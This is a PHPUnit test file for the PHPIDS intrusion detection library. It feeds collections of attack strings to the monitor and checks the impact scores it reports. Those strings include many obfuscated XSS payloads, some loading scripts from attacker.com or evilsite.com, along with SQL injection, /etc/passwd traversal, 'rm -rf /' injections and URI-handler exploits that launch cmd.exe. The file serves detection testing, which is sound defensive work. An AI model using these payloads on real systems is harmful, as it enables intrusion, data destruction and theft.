<?php

/**
 * PHPIDS
 * Requirements: PHP5, SimpleXML
 *
 * Copyright (c) 2007 PHPIDS group (http://php-ids.org)
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the license.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * @package	PHPIDS tests
 * @version	SVN: $Id:MonitorTest.php 517 2007-09-15 15:04:13Z mario $
 */
require_once 'PHPUnit/Framework/TestCase.php';
set_include_path(get_include_path() . PATH_SEPARATOR . dirname(__FILE__) . '/../../lib');
require_once 'IDS/Monitor.php';
require_once 'IDS/Init.php';
require_once 'IDS/Filter/Storage.php';

class IDS_MonitorTest extends PHPUnit_Framework_TestCase {

    public function setUp()
    {
        $this->init = IDS_Init::init('IDS/Config/Config.ini');
    }

    public function testRunWithTags() {
        $test = new IDS_Monitor(
            array('user' => 'admin<script/src=http/attacker.com>'),
            $this->init,
            array('csrf')
        );

        $result = $test->run();

        foreach ($result->getEvent('user')->getFilters() as $filter) {
            $this->assertTrue(in_array('csrf', $filter->getTags()));
        }
    }

    public function testRun() {
        $test = new IDS_Monitor(
            array(
                'id'    => '9<script/src=http/attacker.com>',
                'name'  => '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
            ),
            $this->init
        );

        $result = $test->run();

        $this->assertTrue($result->hasEvent('id'));
        $this->assertTrue($result->hasEvent('name'));
    }

    public function testNoResult() {
        $test = new IDS_Monitor(array('test', 'bla'), $this->init);
        $this->assertTrue($test->run()->isEmpty());
    }

    public function testSetExceptionsString()
    {
        $test = new IDS_Monitor(array('test', 'bla'), $this->init);
        $exception = 'test1';
        $test->setExceptions($exception);
        $result = $test->getExceptions();
        $this->assertEquals($exception, $result[0]);                    
    }

    public function testSetExceptionsArray()
    {
        $test = new IDS_Monitor(array('test', 'bla'), $this->init);
        $exceptions = array('test1', 'test2');
        $test->setExceptions($exceptions);
        $this->assertEquals($exceptions, $test->getExceptions());                    
    }

    public function testList()
    {
        $test = new IDS_Monitor(
            array(
                '9<script/src=http/attacker.com>', 
                '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
            ),
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(18, $result->getImpact());
    }

    public function testListWithJsonFilters()
    {
    	
    	$this->init->config['General']['filter_type'] = 'json';
    	$this->init->config['General']['filter_path'] = 'IDS/default_filter.json';
    	
        $test = new IDS_Monitor(
            array(
                '9<script/src=http/attacker.com>', 
                '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
            ),
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(18, $result->getImpact());
    }    
    
    public function testListWithKeyScanning() {
        $exploits = array();
        $exploits['test1'] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
        $exploits['test2'] = '9<script/src=http/attacker.com>';
        $exploits['9<script/src=http/attacker.com>'] = '9<script/src=http/attacker.com>';
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $test->scanKeys = true;
        $result = $test->run();
        $this->assertEquals(26, $result->getImpact());
    }

    public function testListWithException() {
        $exploits = array();
        $exploits[] = '9<script/src=http/attacker.com>';
        $exploits[] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
        
        $test = new IDS_Monitor( 
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(18, $result->getImpact());
    }

    public function testListWithSubKeys() {
        $exploits = array('9<script/src=http/attacker.com>');
        $exploits[] = array('" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="');
        $exploits[] = array('9<script/src=http/attacker.com>');
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(26, $result->getImpact());
    }

    public function testListWithSubKeysAndExceptions() {
        $exploits = array('test1' => '9<script/src=http://attacker.com>');
        $exploits[] = array('" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="');
        $exploits[] = array('9<script/src=http/attacker.com>');
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $test->setExceptions('test1');
        $result = $test->run();
        $this->assertEquals(18, $result->getImpact());
    }

    public function testAttributeBreakerList() {

        $exploits = array();
        $exploits[] = '" style ="';
        $exploits[] = '"src=xxx a="';
        $exploits[] = '"\' type=\'1';
        $exploits[] = '" a "" b="x"';
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        
        $this->assertEquals(20, $result->getImpact());        
    }     
    
    public function testCommentList() {

        $exploits = array();
        $exploits[] = '<![test';
        $exploits[] = 'test/**/blafasel';
        $exploits[] = 'test{test';
        $exploits[] = 'test#';
        $exploits[] = '<!-- test -->';
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        
        $this->assertEquals(12, $result->getImpact());        
    }    

    public function testConcatenatedXSSList() {

        $exploits = array();
        $exploits[] = "s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+''; u1=s1+s2+s3;URL=u1";
        $exploits[] = "s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;";
        $exploits[] = "s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);";
        $exploits[] = "s1=['java'+''+''+'scr'+'ipt'+':'+'aler'+'t'+'(1)'];";
        $exploits[] = "s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];";
        $exploits[] = "s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';";
        $exploits[] = "s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;";
        $exploits[] = "t0 =1? \"val\":0;t1 =1? \"e\":0;t2 =1? \"nam\":0;t=1? t1+t0:0;t=1?t[1? t:0]:0;t=(1? t:0)(1? (1? t:0)(1? t2+t1:0):0);";
        $exploits[] = "a=1!=1?0:'eva';b=1!=1?0:'l';c=a+b;d=1!=1?0:'locatio';e=1!=1?0:'n.has';f=1!=1?0:'h.substrin';g=1!=1?0:'g(1)';h=d+e+f+g;0[''+(c)](0[''+(c)](h));";
        $exploits[] = 'b=(navigator);c=(b.userAgent);d=c[61]+c[49]+c[6]+c[4];e=\'\'+/abcdefghijklmnopqrstuvwxyz.(1)/;f=e[12]+e[15]+e[3]+e[1]+e[20]+e[9]+e[15]+e[14]+e[27]+e[8]+e[1]+e[19]+e[8]+e[27]+e[19]+e[21]+e[2]+e[19]+e[20]+e[18]+e[9]+e[14]+e[7]+e[28]+e[29]+e[30];0[\'\'+[d]](0[\'\'+(d)](f));';
        $exploits[] = "c4=1==1&&'(1)';c3=1==1&&'aler';c2=1==1&&':';c1=1==1&&'javascript';a=c1+c2+c3+'t'+c4;(URL=a);";
        $exploits[] = "x=''+/abcdefghijklmnopqrstuvwxyz.(1)/;e=x[5];v=x[22];a=x[1];l=x[12];o=x[15];c=x[3];t=x[20];i=x[9];n=x[14];h=x[8];s=x[19];u=x[21];b=x[2];r=x[18];g=x[7];dot=x[27];uno=x[29];op=x[28];cp=x[30];z=e+v+a+l;y=l+o+c+a+t+i+o+n+dot+h+a+s+h+dot+s+u+b+s+t+r+i+n+g+op+uno+cp;0[''+[z]](0[''+(z)](y));";
        $exploits[] = "d=''+/eval~locat~ion.h~ash.su~bstring(1)/;e=/.(x?.*)~(x?.*)~(x?.*)~(x?.*)~(x?.*)./;f=e.exec(d);g=f[2];h=f[3];i=f[4];j=f[5];k=g+h+i+j;0[''+(f[1])](0[''+(f[1])](k));";
        $exploits[] = "a=1!=1?/x/:'eva';b=1!=1?/x/:'l';a=a+b;e=1!=1?/x/:'h';b=1!=1?/x/:'locatio';c=1!=1?/x/:'n';d=1!=1?/x/:'.has';h=1!=1?/x/:'1)';g=1!=1?/x/:'ring(0';f=1!=1?/x/:'.subst';b=b+c+d+e+f+g+h;B=00[''+[a]](b);00[''+[a]](B);";        
        $exploits[] = "(z=String)&&(z=z() );{a=(1!=1)?a:'eva'+z}{a+=(1!=1)?a:'l'+z}{b=(1!=1)?b:'locatio'+z}{b+=(1!=1)?b:'n.has'+z}{b+=(1!=1)?b:'h.subst'+z}{b+=(1!=1)?b:'r(1)'+z}{c=(1!=1)?c:(0)[a]}{d=c(b)}{c(d)}";
        $exploits[] = "{z=(1==4)?here:{z:(1!=5)?'':be}}{y=(9==2)?dragons:{y:'l'+z.z}}{x=(6==5)?3:{x:'a'+y.y}}{w=(5==8)?9:{w:'ev'+x.x}}{v=(7==9)?3:{v:'tr(2)'+z.z}}{u=(3==8)?4:{u:'sh.subs'+v.v}}{t=(6==2)?6:{t:y.y+'ocation.ha'+u.u}}{s=(4==3)?3:{s:(8!=3)?(2)[w.w]:z}}{r=s.s(t.t)}{s.s(r)+z.z}";
        $exploits[] = "{z= (1.==4.)?here:{z: (1.!=5.)?'':be}}{y= (9.==2.)?dragons:{y: 'l'+z.z}}{x= (6.==5.)?3:{x: 'a'+y.y}}{w= (5.==8.)?9:{w: 'ev'+x.x}}{v= (7.==9.)?3:{v: 'tr(2.)'+z.z}}{u= (3.==8.)?4:{u: 'sh.subs'+v.v}}{t= (6.==2.)?6:{t: y.y+'ocation.ha'+u.u}}{s= (4.==3.)?3:{s: (8.!=3.)?(2.)[w.w]:z}}{r= s.s(t.t)}{s.s(r)+z.z}";
        $exploits[] = "a=1==1?1==1.?'':x:x;b=1==1?'val'+a:x;b=1==1?'e'+b:x;c=1==1?'str(1)'+a:x;c=1==1?'sh.sub'+c:x;c=1==1?'ion.ha'+c:x;c=1==1?'locat'+c:x;d=1==1?1==1.?0.[b]:x:x;d(d(c))";
        $exploits[] = "{z =(1)?\"\":a}{y =(1)?{y: 'l'+z}:{y: 'l'+z.z}}x=''+z+'eva'+y.y;n=.1[x];{};;
							o=''+z+\"aler\"+z+\"t(x)\";
							n(o);";
        $exploits[] = ";{z =(1)?\"\":a}{y =(1)?{y: 'eva'+z}:{y: 'l'+z.z}}x=''+z+{}+{}+{};
							{};;
							{v =(0)?z:z}v={_$:z+'aler'+z};
							{k =(0)?z:z}k={_$$:v._$+'t(x)'+z};
							x=''+y.y+'l';{};
							
							n=.1[x];
							n(k._$$)";
        $exploits[] = "ä=/ä/!=/ä/?'': 0;b=(ä+'eva'+ä);b=(b+'l'+ä);d=(ä+'XSS'+ä);c=(ä+'aler'+ä);c=(c+'t(d)'+ä);$=.0[b];a=$;a(c)";
        
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        
        $this->assertEquals(401, $result->getImpact());        
    }     

    public function testConcatenatedXSSList2() {

        $exploits = array();
        $exploits[] = "ä=/ä/?'': 0;b=(ä+'eva'+ä);b=(b+'l'+ä);d=(ä+'XSS'+ä);c=(ä+'aler'+ä);c=(c+'t(d)'+ä);ä=.0[b];ä(c)";
        $exploits[] = "b = (x());
						$ = .0[b];a=$;
						a( h() );
						function x () { return 'eva' + p(); };
						function p() { return 'l' ; };
						function h() { return 'aler' + i(); };
						function i() { return 't (123456)' ; };";
        $exploits[] = "s=function test2() {return 'aalert(1)a';1,1}();
						void(a = {} );
						a.a1=function xyz() {return s[1] }();
						a.a2=function xyz() {return s[2] }();
						a.a3=function xyz() {return s[3] }();
						a.a4=function xyz() {return s[4] }();
						a.a5=function xyz() {return s[5] }();
						a.a6=function xyz() {return s[6] }();
						a.a7=function xyz() {return s[7] }();
						a.a8=function xyz() {return s[8] }();
						$=function xyz() {return a.a1 + a.a2 + a.a3 +a.a4 +a.a5 + a.a6 + a.a7
						+a.a8 }();
						new Function($)();";
        $exploits[] = "x = localName.toLowerCase() + 'lert(1),' + 0x00;new Function(x)()";
                
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        
        $this->assertEquals(50, $result->getImpact());        
    }    

    public function testXMLPredicateXSSList() {

        $exploits = array();
        $exploits[] = "a=<r>loca<v>e</v>tion.has<v>va</v>h.subs<v>l</v>tr(1)</r>
						{b=0e0[a.v.text()
						]}http='';b(b(http+a.text()
						))
						";
        $exploits[] = 'y=<a>alert</a>;content[y](123)';
        $exploits[] = "s1=<s>evalalerta(1)a</s>; s2=<s></s>+''; s3=s1+s2; e1=/s1/?s3[0]:s1; e2=/s1/?s3[1]:s1; e3=/s1/?s3[2]:s1; e4=/s1/?s3[3]:s1; e=/s1/?.0[e1+e2+e3+e4]:s1; a1=/s1/?s3[4]:s1; a2=/s1/?s3[5]:s1; a3=/s1/?s3[6]:s1; a4=/s1/?s3[7]:s1; a5=/s1/?s3[8]:s1; a6=/s1/?s3[10]:s1; a7=/s1/?s3[11]:s1; a8=/s1/?s3[12]:s1; a=a1+a2+a3+a4+a5+a6+a7+a8;e(a)";
                
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        
        $this->assertEquals(34, $result->getImpact());        
    }      
    
    public function testXSSList() {
        
        $exploits = array();
        $exploits[] = '\'\'"--><script>eval(String.fromCharCode(88,83,83)));%00';
        $exploits[] = '"></a style="xss:ex/**/pression(alert(1));"';
        $exploits[] = 'top.__proto__._= alert
                       _(1)';
        $exploits[] = 'document.__parent__._=alert
                      _(1)';
        $exploits[] = 'alert(1)';
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        
        $this->assertEquals(105, $result->getImpact());        
    }

    public function testSelfContainedXSSList() {
        
        $exploits = array();
        $exploits[] = 'a=0||\'ev\'+\'al\',b=0||1[a](\'loca\'+\'tion.hash\'),c=0||\'sub\'+\'str\',1[a](b[c](1));';
        $exploits[] = 'eval.call(this,unescape.call(this,location))';
        $exploits[] = 'd=0||\'une\'+\'scape\'||0;a=0||\'ev\'+\'al\'||0;b=0||\'locatio\';b+=0||\'n\'||0;c=b[a];d=c(d);c(d(c(b)))';
        $exploits[] = '_=eval,__=unescape,___=document.URL,_(__(___))';
        $exploits[] = '$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))';
        $exploits[] = '$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)';
        $exploits[] = 'ev\al.call(this,unescape.call(this,location))';
        $exploits[] = 'setTimeout//
                        (name//
                        ,0)//';
        $exploits[] = 'a=/ev/ 
                        .source
                        a+=/al/ 
                        .source,a = a[a]
                        a(name)';
        $exploits[] = 'a=eval,b=(name);a(b)';
        $exploits[] = 'a=eval,b= [ referrer ] ;a(b)';
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(223, $result->getImpact());        
    }

    public function testSQLIList() {
        
        $exploits = array();
        $exploits[] = '" OR 1=1#';
        $exploits[] = '; DROP table Users --';
        $exploits[] = '/**/S/**/E/**/L/**/E/**/C/**/T * FROM users WHERE 1 = 1';
        $exploits[] = 'admin\'--';
        $exploits[] = 'SELECT /*!32302 1/0, */ 1 FROM tablename';
        $exploits[] = '10;DROP members --';
        $exploits[] = ' SELECT IF(1=1,\'true\',\'false\')';
        $exploits[] = 'SELECT CHAR(0x66)';
        $exploits[] = 'SELECT LOAD_FILE(0x633A5C626F6F742E696E69)';
        $exploits[] = 'EXEC(@stored_proc @param)';
        $exploits[] = 'chr(11)||chr(12)||char(13)';
        $exploits[] = 'MERGE INTO bonuses B USING (SELECT';
        $exploits[] = '1 or name like \'%\'';
        $exploits[] = '1 OR \'1\'!=0';
        $exploits[] = '1 OR ASCII(2) = ASCII(2)';
        $exploits[] = '1\' OR 1&"1';
        $exploits[] = '1\' OR \'1\' XOR \'0 ';
        $exploits[] = '1 OR+1=1';
        $exploits[] = '1 OR+(1)=(1) ';
        $exploits[] = '1 OR \'1';
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(204, $result->getImpact());        
    }
    
    public function testDTList(){
        
        $test1 = '../../etc/passwd';
        $test2 = '\%windir%\cmd.exe';
        $test3 = '1;cat /e*c/p*d';
        if(get_magic_quotes_gpc()){
            $test1 = addslashes($test1);
            $test2 = addslashes($test2);
            $test3 = addslashes($test3);
        }        
        
        $exploits = array();
        $exploits[] = $test1;
        $exploits[] = $test2;
        $exploits[] = $test3;        
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(25, $result->getImpact());        
    }

    public function testURIList(){
        
        $exploits = array();
        $exploits[] = 'firefoxurl:test|"%20-new-window%20file:\c:/test.txt';
        $exploits[] = 'firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"';
        $exploits[] = 'aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"';
        $exploits[] = 'aim:///#1111111/11111111111111111111111111111111111111111111111111111111111112222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222226666666AAAABBBB6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666';
        $exploits[] = 'navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)';
        $exploits[] = 'res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210';
        $exploits[] = 'mailto:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat';

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(121, $result->getImpact());          
    }    
    
    public function testRFEList() {
        
        $exploits = array();
        $exploits[] = ';phpinfo()';
        $exploits[] = '"; <?php exec("rm -rf /"); ?>';
        $exploits[] = '; file_get_contents(\'/usr/local/apache2/conf/httpd.conf\');';
        $exploits[] = ';echo file_get_contents(implode(DIRECTORY_SEPARATOR, array("usr","local","apache2","conf","httpd.conf"))';
        $exploits[] = '; include "http://evilsite.com/evilcode"';
        $exploits[] = '; rm -rf /\0';
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(108, $result->getImpact());       
    }

    public function testDecimalCCConverter() {
        
        $exploits = array();
        $exploits[] = '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#108;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#61;&#34;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#62;&#32;&#10;&#47;&#47;&#32;&#67;&#114;&#101;&#97;&#109;&#111;&#115;&#32;&#108;&#97;&#32;&#99;&#108;&#97;&#115;&#101;&#32;&#10;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#32;&#41;&#32;&#123;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#250;&#98;&#108;&#105;&#99;&#111;&#32;&#105;&#110;&#105;&#99;&#105;&#97;&#108;&#105;&#122;&#97;&#100;&#111;&#32;&#97;&#32;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#32;&#10;&#32;&#116;&#104;&#105;&#115;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#39;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#114;&#105;&#118;&#97;&#100;&#111;&#32;&#112;&#97;&#114;&#97;&#32;&#101;&#108;&#32;&#111;&#98;&#106;&#101;&#116;&#111;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#32;&#10;&#32;&#118;&#97;&#114;&#32;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#117;&#108;&#108;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#46;&#46;&#46;&#32;&#10;&#125;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#101;&#119;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#41;&#59;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#112;&#114;&#111;&#103;&#114;&#97;&#109;&#97;&#99;&#105;&#111;&#110;&#119;&#101;&#98;&#46;&#110;&#101;&#116;&#47;&#39;&#59;&#32;&#10;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#32;&#10;&#32;';
        $exploits[] = '60,115,99,114,105,112,116,62,97,108,100+1,114,116,40,49,41,60,47,115,99,114,105,112,116,62';     
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(74, $result->getImpact());              
    }

    public function testOctalCCConverter() {
    
        $test1 = 'XXX';
        $test2 = '\74\163\143\162\151\160\164\76\141\154\145\162\164\50\47\150\151\47\51\74\57\163\143\162\151\160\164\76';
        
        if(get_magic_quotes_gpc()){
            $test1 = addslashes($test1);
            $test2 = addslashes($test2);
        }        

        $exploits = array();
        $exploits[] = $test1;
        $exploits[] = $test2;          
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(41, $result->getImpact());              
    }

    public function testHexCCConverter() {
        $test1 = ';&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x3e;&#x20;&#x0a;&#x2f;&#x2f;&#x20;&#x43;&#x72;&#x65;&#x61;&#x6d;&#x6f;&#x73;&#x20;&#x6c;&#x61;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x65;&#x20;&#x0a;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x20;&#x29;&#x20;&#x7b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#xfa;&#x62;&#x6c;&#x69;&#x63;&#x6f;&#x20;&#x69;&#x6e;&#x69;&#x63;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x64;&#x6f;&#x20;&#x61;&#x20;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x20;&#x0a;&#x20;&#x74;&#x68;&#x69;&#x73;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x27;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x64;&#x6f;&#x20;&#x70;&#x61;&#x72;&#x61;&#x20;&#x65;&#x6c;&#x20;&#x6f;&#x62;&#x6a;&#x65;&#x74;&#x6f;&#x20;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x20;&#x0a;&#x20;&#x76;&#x61;&#x72;&#x20;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x75;&#x6c;&#x6c;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x2e;&#x2e;&#x2e;&#x20;&#x0a;&#x7d;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x29;&#x3b;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x70;&#x72;&#x6f;&#x67;&#x72;&#x61;&#x6d;&#x61;&#x63;&#x69;&#x6f;&#x6e;&#x77;&#x65;&#x62;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x27;&#x3b;&#x20;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x20;&#x0a;&#x20;';
        $test2 = '\x0000003c\x0000073\x0000063\x0000072\x0000069\x0000070\x0000074\x000003e\x0000061\x000006c\x0000065\x0000072\x0000074\x0000028\x0000032\x0000029\x000003c\x000002f\x0000073\x0000063\x0000072\x0000069\x0000070\x0000074\x000003e';
        
        if(get_magic_quotes_gpc()){
            $test1 = addslashes($test1);
            $test2 = addslashes($test2);
        } 
        
        $exploits = array();
        $exploits[] = $test1;
        $exploits[] = $test2;          
        
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(81, $result->getImpact());              
    }
}
